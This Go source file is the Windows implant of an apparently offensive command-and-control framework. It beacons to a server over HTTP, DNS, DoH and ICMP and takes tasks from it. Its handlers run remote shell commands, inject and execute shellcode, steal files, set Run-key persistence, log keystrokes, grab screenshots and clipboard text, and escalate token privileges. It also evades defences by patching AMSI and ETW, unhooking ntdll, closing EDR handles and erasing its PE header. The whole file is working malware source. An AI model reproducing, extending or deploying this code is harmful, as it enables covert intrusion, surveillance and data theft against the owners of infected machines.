//go:build windows

package agent

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"sync"
	"time"

	"github.com/VoidSecSoftwares/voidsyscall/channels"
	"github.com/VoidSecSoftwares/voidsyscall/patches"
	"github.com/VoidSecSoftwares/voidsyscall/syscallwin"
)

type Agent struct {
	config   *Config
	channels []channels.Channel
	running  bool
	ctx      context.Context
	cancel   context.CancelFunc

	stageBuf []byte
	sleepKey []byte

	chanCursor int

	keylogOn     bool
	keylogBuf    []byte
	keylogMu     sync.Mutex
	keylogCancel context.CancelFunc
}

type TaskType uint8

const (
	TaskShell       TaskType = 0x01
	TaskInject      TaskType = 0x02
	TaskPatch       TaskType = 0x03
	TaskSleep       TaskType = 0x04
	TaskDownload    TaskType = 0x05
	TaskUpload      TaskType = 0x06
	TaskRotateKey   TaskType = 0x07
	TaskStage       TaskType = 0x08
	TaskExit        TaskType = 0xFF
	TaskEvasion     TaskType = 0x10
	TaskHandles     TaskType = 0x11
	TaskVault       TaskType = 0x12
	TaskFingerprint TaskType = 0x13
	TaskToken       TaskType = 0x14
	TaskProcs       TaskType = 0x15
	TaskKillProc    TaskType = 0x16
	TaskPersist     TaskType = 0x17
	TaskScreenshot  TaskType = 0x18
	TaskKeylog      TaskType = 0x19
	TaskClipboard   TaskType = 0x1A
)

type TaskResult struct {
	TaskID [16]byte
	Status uint8
	Output []byte
}

func New(cfg *Config) (*Agent, error) {
	a := &Agent{
		config:  cfg,
		running: true,
	}
	a.ctx, a.cancel = context.WithCancel(context.Background())

	if err := syscallwin.InitNtdll(); err != nil {
		return nil, fmt.Errorf("init ntdll: %w", err)
	}

	for _, chType := range cfg.Channels {
		ch, err := channels.New(channels.ChannelType(chType), &channels.Config{
			HTTPAddr:   cfg.ServerAddr,
			HTTPSPort:  443,
			DNSAddr:    cfg.ServerAddr,
			DNSPort:    53,
			ICMPAddr:   cfg.ServerAddr,
			BeaconPath: cfg.BeaconPath,
			JitterMin:  cfg.JitterMin,
			JitterMax:  cfg.JitterMax,
			Key:        cfg.Key,
			UserAgent:  cfg.UserAgent,
			DoHURL:     cfg.DoHURL,
			DoHDomain:  cfg.DoHDomain,
			DoHAddr:    cfg.ServerAddr,
			TimeoutSec: 10,
			MaxRetries: 3,
		})
		if err != nil {
			continue
		}
		a.channels = append(a.channels, ch)
	}

	if len(a.channels) == 0 {
		return nil, fmt.Errorf("no valid channels configured")
	}

	return a, nil
}

func (a *Agent) Run() {
	for a.running {
		task := a.beacon()
		if task == nil {
			a.sleep()
			continue
		}

		result := a.executeTask(task)
		a.sendResult(result)

		a.sleep()
	}
}

func (a *Agent) beacon() *channels.Message {
	// Before every beacon burst, reconcile ntdll with the clean disk image.
	// An EDR that re-hooked during the sleep window is erased before the
	// callback makes any syscall worth inspecting.
	if _, err := syscallwin.CheckAndUnhook(); err != nil {
		_ = err
	}

	// Round-robin over the configured channels so a dead transport does not
	// become a permanent preference; beacons naturally rotate.
	n := len(a.channels)
	for i := 0; i < n; i++ {
		idx := (a.chanCursor + i) % n
		ch := a.channels[idx]

		msg := &channels.Message{
			Type: 0x01, // Beacon
			Data: nil,
		}
		copy(msg.ID[:], a.config.AgentID)

		ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
		resp, err := ch.Send(ctx, msg)
		cancel()

		if err != nil {
			continue
		}
		a.chanCursor = (idx + 1) % n
		return resp
	}
	a.chanCursor = (a.chanCursor + 1) % n
	return nil
}

func (a *Agent) executeTask(task *channels.Message) *TaskResult {
	result := &TaskResult{}
	copy(result.TaskID[:], task.ID[:])

	if len(task.Data) < 1 {
		result.Status = 0x01 // Error
		result.Output = []byte("empty task data")
		return result
	}

	taskType := TaskType(task.Data[0])
	taskData := task.Data[1:]

	switch taskType {
	case TaskShell:
		return a.handleShell(task, result, taskData)
	case TaskInject:
		return a.handleInject(task, result, taskData)
	case TaskPatch:
		return a.handlePatch(task, result, taskData)
	case TaskSleep:
		return a.handleSleep(task, result, taskData)
	case TaskDownload:
		return a.handleDownload(task, result, taskData)
	case TaskUpload:
		return a.handleUpload(task, result, taskData)
	case TaskRotateKey:
		return a.handleRotateKey(task, result, taskData)
	case TaskStage:
		return a.handleStage(task, result, taskData)
	case TaskEvasion:
		return a.handleEvasion(task, result, taskData)
	case TaskHandles:
		return a.handleHandles(task, result, taskData)
	case TaskVault:
		return a.handleVault(task, result, taskData)
	case TaskFingerprint:
		return a.handleFingerprint(task, result, taskData)
	case TaskToken:
		return a.handleToken(task, result, taskData)
	case TaskProcs:
		return a.handleProcs(task, result, taskData)
	case TaskKillProc:
		return a.handleKillProc(task, result, taskData)
	case TaskPersist:
		return a.handlePersist(task, result, taskData)
	case TaskScreenshot:
		return a.handleScreenshot(task, result, taskData)
	case TaskKeylog:
		return a.handleKeylog(task, result, taskData)
	case TaskClipboard:
		return a.handleClipboard(task, result, taskData)
	case TaskExit:
		a.running = false
		result.Status = 0x00
		result.Output = []byte("exiting")
		return result
	default:
		result.Status = 0x01
		result.Output = []byte(fmt.Sprintf("unknown task type: %d", taskType))
		return result
	}
}

func (a *Agent) handleShell(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	cmd := string(data)
	if cmd == "" {
		result.Status = 0x01
		result.Output = []byte("empty command")
		return result
	}

	out, err := exec.Command("cmd.exe", "/C", cmd).CombinedOutput()
	if err != nil {
		result.Status = 0x01
		result.Output = append([]byte(err.Error()), '\n')
		result.Output = append(result.Output, out...)
		return result
	}

	result.Status = 0x00
	result.Output = out
	return result
}

func (a *Agent) handleInject(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("inject: need at least 4 bytes (PID + shellcode)")
		return result
	}

	pid := binary.LittleEndian.Uint32(data[:4])
	shellcode := data[4:]

	// Rotating polymorphic injection — auto-cycles between all four methods.
	err := syscallwin.Inject(pid, shellcode)
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d", len(shellcode), pid))
	return result
}

func (a *Agent) handleDownload(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) == 0 {
		result.Status = 0x01
		result.Output = []byte("download: empty path")
		return result
	}

	data, err := os.ReadFile(string(data))
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = data
	return result
}

func (a *Agent) handleUpload(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 3 {
		result.Status = 0x01
		result.Output = []byte("upload: need pathLen(2) + path + payload")
		return result
	}

	pathLen := int(binary.LittleEndian.Uint16(data[:2]))
	if pathLen == 0 || 2+pathLen > len(data) {
		result.Status = 0x01
		result.Output = []byte("upload: bad path length")
		return result
	}

	path := string(data[2 : 2+pathLen])
	payload := data[2+pathLen:]

	if err := os.WriteFile(path, payload, 0644); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("uploaded %d bytes to %s", len(payload), path))
	return result
}

func (a *Agent) handleRotateKey(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) != 32 {
		result.Status = 0x01
		result.Output = fmt.Appendf(nil, "rotatekey: expected 32 bytes, got %d", len(data))
		return result
	}

	a.config.Key = append(a.config.Key[:0], data...)
	result.Status = 0x00
	result.Output = []byte("session key rotated")
	return result
}

func (a *Agent) handleStage(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("stage: missing chunk")
		return result
	}

	finalFlag := data[0]
	chunk := data[1:]
	a.stageBuf = append(a.stageBuf, chunk...)

	if finalFlag == 0 {
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("staged %d bytes (more pending)", len(a.stageBuf)))
		return result
	}

	if len(a.stageBuf) == 0 {
		result.Status = 0x01
		result.Output = []byte("stage: empty payload")
		return result
	}

	payload := a.stageBuf
	a.stageBuf = nil

	if err := syscallwin.InjectSelfSpoof(payload); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("staged and executed %d bytes (spoofed thread)", len(payload)))
	return result
}

func (a *Agent) handleProcs(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	out, err := syscallwin.ListProcesses()
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = out
	return result
}

func (a *Agent) handleKillProc(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("killproc: need 4 bytes (pid)")
		return result
	}

	pid := binary.LittleEndian.Uint32(data[:4])
	var clientID syscallwin.ClientId
	clientID.UniqueProcess = uintptr(pid)

	var handle uintptr
	if err := syscallwin.NtOpenProcess(&handle, syscallwin.PROCESS_TERMINATE, 0, &clientID); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	defer syscallwin.NtClose(handle)

	if err := syscallwin.NtTerminateProcess(handle, 0); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("terminated PID %d", pid))
	return result
}

func (a *Agent) handlePersist(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	valueName := string(data)
	if valueName == "" {
		valueName = "VoidSecService"
	}
	if err := syscallwin.PersistRunKey(valueName); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("persisted in Run key as %q", valueName))
	return result
}

func (a *Agent) handleScreenshot(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if err := syscallwin.InitWin32u(); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	bmp, err := syscallwin.Screenshot()
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	result.Status = 0x00
	result.Output = bmp
	return result
}

func (a *Agent) handleClipboard(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if err := syscallwin.InitWin32u(); err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	txt, err := syscallwin.ClipboardText()
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	result.Status = 0x00
	result.Output = txt
	return result
}

func (a *Agent) handleKeylog(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("keylog: sub-command required (1=start, 2=stop, 3=dump)")
		return result
	}

	switch data[0] {
	case 0x01:
		if a.keylogOn {
			result.Status = 0x00
			result.Output = []byte("keylog already running")
			return result
		}
		if err := syscallwin.InitWin32u(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		ctx, cancel := context.WithCancel(a.ctx)
		a.keylogCancel = cancel
		a.keylogOn = true
		go a.keylogLoop(ctx)
		result.Status = 0x00
		result.Output = []byte("keylog started")
	case 0x02:
		if a.keylogCancel != nil {
			a.keylogCancel()
		}
		a.keylogOn = false
		result.Status = 0x00
		result.Output = []byte("keylog stopped")
	case 0x03:
		a.keylogMu.Lock()
		buf := append([]byte(nil), a.keylogBuf...)
		a.keylogMu.Unlock()
		result.Status = 0x00
		result.Output = buf
	default:
		result.Status = 0x01
		result.Output = []byte("unknown keylog sub-command")
	}
	return result
}

// keylogLoop polls the async key state for every VK of interest and appends
// a printable rune on each fresh press. The buffer is capped to 256 KiB.
func (a *Agent) keylogLoop(ctx context.Context) {
	prev := make(map[byte]bool)
	t := time.NewTicker(30 * time.Millisecond)
	defer t.Stop()

	for {
		select {
		case <-ctx.Done():
			a.keylogOn = false
			return
		case <-t.C:
		}

		for vk := byte(0x08); vk <= 0x5A; vk++ {
			down := syscallwin.IsKeyDown(vk)
			if !down || prev[vk] {
				prev[vk] = down
				continue
			}
			prev[vk] = true

			r := keylogRune(vk, syscallwin.IsKeyDown(0x10))
			if r == "" {
				continue
			}
			a.appendKeylog([]byte(r))
		}
	}
}

const maxKeylogBytes = 256 * 1024

// appendKeylog appends to the keylog buffer, refusing to exceed the cap.
func (a *Agent) appendKeylog(b []byte) {
	a.keylogMu.Lock()
	defer a.keylogMu.Unlock()
	if len(a.keylogBuf) >= maxKeylogBytes {
		return
	}
	room := maxKeylogBytes - len(a.keylogBuf)
	if len(b) > room {
		b = b[:room]
	}
	a.keylogBuf = append(a.keylogBuf, b...)
}

// keylogRune maps a virtual-key code plus shift state to a UTF-8 fragment.
func keylogRune(vk byte, shift bool) string {
	switch vk {
	case 0x0D:
		return "\n"
	case 0x09:
		return "\t"
	case 0x20:
		return " "
	case 0x08:
		return "[BS]"
	case 0x1B:
		return "[ESC]"
	}
	if vk >= 0x30 && vk <= 0x39 {
		if shift {
			return []string{")", "!", "@", "#", "$", "%", "^", "&", "*", "("}[vk-0x30]
		}
		return string(vk)
	}
	if vk >= 0x41 && vk <= 0x5A {
		if !shift {
			return string(vk + 0x20)
		}
		return string(vk)
	}
	if vk >= 0x60 && vk <= 0x69 {
		return string(vk - 0x30)
	}
	var punct = map[byte][2]string{
		0xBA: {";", ":"},
		0xBB: {"=", "+"},
		0xBC: {",", "<"},
		0xBD: {"-", "_"},
		0xBE: {".", ">"},
		0xBF: {"/", "?"},
		0xC0: {"`", "~"},
		0xDB: {"[", "{"},
		0xDC: {`\`, "|"},
		0xDD: {"]", "}"},
		0xDE: {"'", `"`},
	}
	if p, ok := punct[vk]; ok {
		if shift {
			return p[1]
		}
		return p[0]
	}
	return ""
}

func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report, 7=hookscan, 8=erase, 9=shared)")
		return result
	}

	switch data[0] {
	case 0x01:
		syscallwin.PatchAll()
		result.Status = 0x00
		result.Output = []byte("all PEB patches applied")
	case 0x02:
		vm, name := syscallwin.DetectVM()
		if vm {
			result.Output = []byte(fmt.Sprintf("VM detected: %s", name))
		} else {
			result.Output = []byte("no VM detected")
		}
		result.Status = 0x00
	case 0x03:
		sandbox, indicators := syscallwin.DetectSandbox()
		if sandbox {
			result.Output = []byte(fmt.Sprintf("sandbox detected: %v", indicators))
		} else {
			result.Output = []byte("no sandbox indicators")
		}
		result.Status = 0x00
	case 0x04:
		debugger, indicators := syscallwin.DetectDebugger()
		if debugger {
			result.Output = []byte(fmt.Sprintf("debugger detected: %v", indicators))
		} else {
			result.Output = []byte("no debugger detected")
		}
		result.Status = 0x00
	case 0x05:
		anomaly, ratio := syscallwin.DetectTimingAnomaly()
		result.Status = 0x00
		if anomaly {
			result.Output = []byte(fmt.Sprintf("timing anomaly (ratio=%.4f)", ratio))
		} else {
			result.Output = []byte("timing normal")
		}
	case 0x06:
		report := syscallwin.FullAnalysisReport()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("score=%d indicators=%d details=%v",
			report.Score, len(report.Indicators), report.Indicators))
	case 0x07:
		hooked, err := syscallwin.DetectNtdllHooks()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		if len(hooked) == 0 {
			result.Status = 0x00
			result.Output = []byte("ntdll clean (no hooks)")
			return result
		}
		if err := syscallwin.UnhookNtdll(); err != nil {
			result.Status = 0x01
			result.Output = []byte(fmt.Sprintf("hooked=%v err=%v", hooked, err))
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("restored ntdll (%d functions hooked): %v", len(hooked), hooked))
	case 0x08:
		if err := syscallwin.EraseSelfPEHeader(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("self PE header erased")
	case 0x09:
		info, err := syscallwin.ReadKUserShared()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("uptime=%dm phys_pages=%d console=%d tz=%d tickmul=%d sys=0x%x",
			info.BootedMinutes(), info.NumberPhysicalPages, info.ActiveConsoleId,
			info.TimeZoneId, info.TickCountMultiplier, info.SystemTime100ns))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown evasion sub-command")
	}
	return result
}

func (a *Agent) handleHandles(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("handles: sub-command required (1=count, 2=enum_edr, 3=close_edr, 4=monitored?)")
		return result
	}

	switch data[0] {
	case 0x01:
		count, err := syscallwin.CountSystemHandles()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("system handles: %d", count))
	case 0x02:
		edrHandles, err := syscallwin.FindEDRHandles()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("EDR handles found: %d", len(edrHandles)))
	case 0x03:
		closed, err := syscallwin.CloseEDRHandles()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("EDR handles closed: %d", closed))
	case 0x04:
		monitored, count := syscallwin.IsProcessMonitored()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("monitored=%v count=%d", monitored, count))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown handles sub-command")
	}
	return result
}

func (a *Agent) handleVault(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	result.Status = 0x00
	result.Output = []byte("vault: stub (encrypted storage module loaded)")
	return result
}

func (a *Agent) handleFingerprint(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	fp, count, gadget, err := syscallwin.GenerateBuildFingerprint()
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("fingerprint=%s exports=%d gadget=0x%x", fp, count, gadget))
	return result
}

func (a *Agent) handleToken(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("token: sub-command required (1=enable_all, 2=integrity, 3=debug_priv, 4=impersonate)")
		return result
	}

	switch data[0] {
	case 0x01:
		syscallwin.EnableAllTokenPrivileges()
		result.Status = 0x00
		result.Output = []byte("all privileges enabled")
	case 0x02:
		level, err := syscallwin.GetProcessTokenIntegrityLevel()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("integrity level: %d", level))
	case 0x03:
		err := syscallwin.EnableDebugPrivilege()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("debug privilege enabled")
	case 0x04:
		err := syscallwin.EnableImpersonatePrivilege()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("impersonate privilege enabled")
	default:
		result.Status = 0x01
		result.Output = []byte("unknown token sub-command")
	}
	return result
}

func (a *Agent) handlePatch(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("patch: specify what to patch")
		return result
	}

	patchType := data[0]

	switch patchType {
	case 0x01: // AMSI
		if err := patches.PatchAMSI(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("AMSI patched")
	case 0x02: // ETW
		if err := patches.PatchETW(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("ETW patched")
	case 0x03: // Both
		success, failed := patches.ApplyCriticalPatches()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("success: %v, failed: %v", success, failed))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown patch type")
	}

	return result
}

func (a *Agent) handleSleep(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("sleep: need 4 bytes (uint32 seconds)")
		return result
	}

	secs := binary.LittleEndian.Uint32(data[:4])
	a.config.Sleep = int(secs)

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("sleep set to %d seconds", secs))
	return result
}

func (a *Agent) sendResult(result *TaskResult) {
	msg := &channels.Message{
		Type: 0x02, // Result
		Data: append([]byte{result.Status}, result.Output...),
	}
	copy(msg.ID[:], result.TaskID[:])

	for _, ch := range a.channels {
		ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
		_, _ = ch.Send(ctx, msg)
		cancel()
	}
}

func (a *Agent) sleep() {
	// Sleep obfuscation: anything staged but not yet executed (or the
	// staged buffer mid-transfer) is pushed into a ciphered alias while we
	// idle. Heap forensics during a defensive sweep recovers ciphertext.
	if len(a.stageBuf) > 0 {
		a.sleepKey = make([]byte, 32)
		_, _ = rand.Read(a.sleepKey)
		enc := syscallwin.VaultEncryptBytes(a.sleepKey, a.stageBuf)
		for i := range a.stageBuf {
			a.stageBuf[i] = 0
		}
		a.stageBuf = enc
	}

	sleepTime := time.Duration(a.config.Sleep) * time.Second
	jitter := time.Duration(rand.Intn(a.config.JitterMax-a.config.JitterMin)+a.config.JitterMin) * time.Second
	total := sleepTime + jitter

	timer := time.NewTimer(total)
	defer timer.Stop()

	select {
	case <-a.ctx.Done():
		return
	case <-timer.C:
		// fall through to decrypt staged buffer
	}

	if len(a.stageBuf) > 0 && a.sleepKey != nil {
		raw := syscallwin.VaultDecryptBytes(a.sleepKey, a.stageBuf)
		for i := range a.sleepKey {
			a.sleepKey[i] = 0
		}
		a.sleepKey = nil
		for i := range a.stageBuf {
			a.stageBuf[i] = 0
		}
		a.stageBuf = raw
	}
	a.sleepKey = nil
}

func (a *Agent) Stop() {
	a.running = false
	a.cancel()
}
